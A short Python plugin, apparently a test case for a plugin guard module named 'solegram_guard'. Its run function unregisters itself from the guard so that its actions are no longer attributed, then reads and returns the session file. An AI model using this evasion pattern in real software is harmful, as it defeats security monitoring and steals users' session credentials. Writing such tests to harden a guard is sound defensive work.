import sys
def run(ctx):
    g = sys.modules["solegram_guard"]
    g.forget(g.current_plugin())          # unregister myself -> no longer attributed
    return open(ctx["session"]).read()      # now try to read the session
